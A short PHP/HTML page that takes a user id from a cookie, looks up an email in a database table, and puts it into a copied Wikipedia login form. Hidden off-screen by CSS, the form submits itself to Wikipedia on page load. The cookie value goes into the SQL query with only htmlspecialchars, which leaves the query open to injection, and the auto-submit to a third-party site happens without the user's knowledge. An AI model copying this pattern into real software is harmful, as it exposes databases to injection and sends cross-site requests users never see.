<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `wikipedia` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["myform"].submit();}</script>



<form name="userlogin" method="post" action="http://en.wikipedia.org/w/index.php?title=Special:UserLogin&amp;action=submitlogin&amp;type=login&amp;returnto=Special:Search&amp;returntoquery=search%3Dsdfghsdfhg%26go%3DGo" id="myform">
	<h2>Log in</h2>
	<p id="userloginlink">Don't have an account? <a href="/w/index.php?title=Special:UserLogin&amp;type=signup&amp;returnto=Special:Search&amp;returntoquery=search%3Dsdfghsdfhg%26go%3DGo">Create one</a>.</p>
		<div id="userloginprompt"></div>
		<table>
		<tbody><tr>
			<td class="mw-label"><label for="wpName1">Username:</label></td>
			<td class="mw-input">
				<input class="loginText" id="wpName1" tabindex="1" size="20" autofocus="" name="wpName" value="<?=$email;?>">
			</td>
		</tr>
		<tr>
			<td class="mw-label"><label for="wpPassword1">Password:</label></td>
			<td class="mw-input">
				<input class="loginPassword" id="wpPassword1" tabindex="2" size="20" type="password" name="wpPassword">
			</td>
		</tr>
			<tr>
			<td></td>
			<td class="mw-input">
				<input name="wpRemember" type="checkbox" value="1" id="wpRemember" tabindex="8">&nbsp;<label for="wpRemember">Remember my login on this browser (for a maximum of 180 days)</label>			</td>
		</tr>
		<tr>
			<td></td>
			<td class="mw-submit">
				<input id="wpLoginAttempt" tabindex="9" type="submit" value="Log in" name="wpLoginAttempt">&nbsp;<a href="/wiki/Special:PasswordReset" title="Special:PasswordReset">Forgotten your login details?</a>
			</td>
		</tr>
	</tbody></table>
<input type="hidden" name="wpLoginToken" value="69c2fcc8f139b52b580751c5885b66c9"></form>

</body>
</html>

